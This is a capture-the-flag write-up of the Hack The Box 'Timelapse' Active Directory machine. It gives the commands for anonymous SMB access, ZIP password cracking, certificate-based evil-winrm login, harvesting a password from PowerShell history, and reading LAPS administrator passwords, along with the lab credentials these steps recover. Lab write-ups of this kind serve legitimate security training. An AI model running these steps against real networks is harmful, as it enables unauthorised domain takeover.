---
title: 'Timelapse: LAPS in Time - From Anonymous SMB to Domain Admin'
published: 2026-05-13
description: ''
image: ''
tags: ['Active Directory']
category: 'Penetration Tester'
draft: false 
lang: ''
---


# 1. Introduction

**Timelapse** is an Easy‑rated Windows Active Directory box on Hack The Box. The initial foothold relies on cracking a password‑protected ZIP archive that is freely available via an anonymous SMB share. Inside is a `.pfx` certificate that – once unlocked – gives shell access over WinRM. Privesc follows a classic AD route: find credentials in PowerShell history, then abuse membership of the `LAPS_Readers` group to retrieve the local Administrator password of the Domain Controller.

# 2. Reconnaissance

## 2.1 Nmap Scan

A full TCP port scan (`-p-`) reveals 18 open ports, all typical for a Windows Domain Controller:

```
nmap -p- --open

PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5986/tcp  open  wsmans
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49696/tcp open  unknown
62656/tcp open  unknown
```

A version scan (`-sCV`) confirms strong indicators of Active Directory: Kerberos, LDAP, SMB, and the SSL‑encrypted WinRM on **5986**. The SSL certificate’s Common Name is `dc01.timelapse.htb`, revealing the domain name.

```
Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
Domain: timelapse.htb0., Site: Default-First-Site-Name
Hostname: dc01.timelapse.htb
```

To make life easier, add the following line to `/etc/hosts`:

```
10.10.11.151 timelapse.htb dc01.timelapse.htb
```

## 2.2 SMB Enumeration (port 445)

Using `smbclient` with a null session, it’s possible to list shares and browse the `open` share:

```bash
smbclient -N -L //10.10.11.151        # list shares
smbclient -N //10.10.11.151/open    # connect to “open”
```

Within the `open` share, two important items appear:

```
  .                                       D        0  ...
  ..                                      D        0  ...
  winrm_backup.zip                       A    25200  ...
  HelpDesk                               D        0  ...
```

The `winrm_backup.zip` file is the key to the first shell. The `HelpDesk` folder contains LAPS‑related files (`.msi`, `.docx`), a strong hint that LAPS will be used later.

# 3. Shell as **legacyy**

## 3.1 Crack the ZIP Password

Download the ZIP:

```bash
smbclient -N //10.10.11.151/open -c "get winrm_backup.zip"
```

The archive is password‑protected. Generate a hash with `zip2john` and crack it with John the Ripper using the `rockyou.txt` wordlist:

```bash
zip2john winrm_backup.zip > zip.hash
john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

John quickly recovers the password: **`supersecret`**.

Unzip the archive:

```bash
unzip winrm_backup.zip
# password: supersecret
```

The extracted file is `legacyy_dev_auth.pfx`.

```
Archive: winrm_backup.zip
 extracting: legacyy_dev_auth.pfx
```

## 3.2 Extract the Certificate and Private Key

A `.pfx` (PKCS#12) file contains a certificate and an encrypted private key. `openssl` is used to extract both:

```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.key
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy_dev_auth.crt
```

The private key is encrypted, so when prompted for the import password, **“supersecret”** works again. After extraction, the public certificate (`legacyy_dev_auth.crt`) and the decrypted private key (`legacyy_dev_auth.key`) are available.

*Image description:*

```
+----------------------------------------------------+
|  PFX File Extraction Diagram                       |
|                                                    |
|  winrm_backup.zip  ────▶  legacyy_dev_auth.pfx     |
|      (supersecret)        /              \\         |
|                    .crt (public)    .key (private)  |
+----------------------------------------------------+
```

(Visual representation of the extraction process)

## 3.3 WinRM Access with Evil‑WinRM

Evil‑WinRM can authenticate using a public/private key pair instead of a password. Connect to the SSL‑enabled WinRM on port 5986:

```bash
evil-winrm -i timelapse.htb -S \\
  -c legacyy_dev_auth.crt \\
  -k legacyy_dev_auth.key
```

A shell as **legacyy** is obtained. The user flag can now be read:

```powershell
type C:\\Users\\legacyy\\desktop\\user.txt
```

```
35a0dfaa************************
```

# 4. Shell as **svc_deploy**

## 4.1 PowerShell History File

One of the first post‑exploitation enumeration steps is checking the PowerShell history. The file is located at:

```powershell
C:\\Users\\legacyy\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt
```

```powershell
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```

The plaintext password for **svc_deploy** is embedded in the history: `E3R$Q62^12p7PLlC%KWaxuaV`.

## 4.2 WinRM as svc_deploy

Using the discovered credentials, a new Evil‑WinRM session is established:

```bash
evil-winrm -i timelapse.htb -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
```

The user `svc_deploy` is a member of `Remote Management Use` (which allows WinRM) and, crucially, the `LAPS_Readers` group:

```
Local Group Memberships      *Remote Management Use
Global Group memberships     *LAPS_Readers
                             *Domain Users
```

# 5. Shell as **Administrator** (root)

## 5.1 What is LAPS?

**Local Administrator Password Solution (LAPS)** is a Microsoft technology that manages the local Administrator passwords of domain‑joined computers. The Domain Controller stores the passwords in Active Directory and rotates them periodically. A specific Active Directory group (`LAPS_Readers`) is granted read access to these passwords.

By default, the password is stored in the `ms-Mcs-AdmPwd` attribute of the computer object.

## 5.2 Retrieve the Administrator Password

Because `svc_deploy` is in `LAPS_Readers`, the LAPS password can be read with a simple AD command:

```powershell
Get-ADComputer DC01 -property 'ms-mcs-admpwd'
```

Output:

```
DistinguishedName : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
DNSHostName       : dc01.timelapse.htb
Enabled           : True
ms-mcs-admpwd     : uM[3va(s870g6Y]9i]6tMu{j
Name              : DC01
ObjectClass       : computer
```

The attribute `ms-mcs-admpwd` contains the plaintext Administrator password.

## 5.3 WinRM as Administrator

With this password, use Evil‑WinRM once more to get a privileged shell:

```bash
evil-winrm -i timelapse.htb -u administrator -p 'uM[3va(s870g6Y]9i]6tMu{j' -S
```

Read the root flag:

```powershell
type C:\\Users\\Administrator\\Desktop\\root.txt
```

*Image description:*

```
+---------------------------------------------+
|  LAPS Password Retrieval Flow               |
|                                             |
|  svc_deploy (LAPS_Readers)                  |
|         |                                   |
|         v                                   |
|  Get-ADComputer DC01 -prop ms-mcs-admpwd    |
|         |                                   |
|         v                                   |
|  ms-mcs-admpwd: uM[3va(s870g6Y]9i]6tMu{j   |
|         |                                   |
|         v                                   |
|  Evil-WinRM as Administrator                |
+---------------------------------------------+
```

(Visual flow of privilege escalation via LAPS)

# 6. Conclusion

Timelapse is an excellent beginner‑friendly AD box that teaches several essential hacking techniques:

1. **Enumerating SMB shares** with null authentication.
2. **Cracking password‑protected ZIPs** using `zip2john` and `john`.
3. **Extracting certificates and keys** from a `.pfx` file with `openssl`.
4. **Authenticating to WinRM** using public/private key pairs with `evil-winrm`.
5. **Harvesting credentials from PowerShell history** – a common misconfiguration in Windows environments.
6. **Abusing LAPS** to retrieve the Domain Controller’s local Administrator password.

The box highlights the importance of secure configurations: anonymous SMB shares, password reuse, unencrypted PowerShell logs, and the power they can give to an attacker – and, of course, how LAPS can be both a security measure and a privilege‑escalation vector if improperly managed.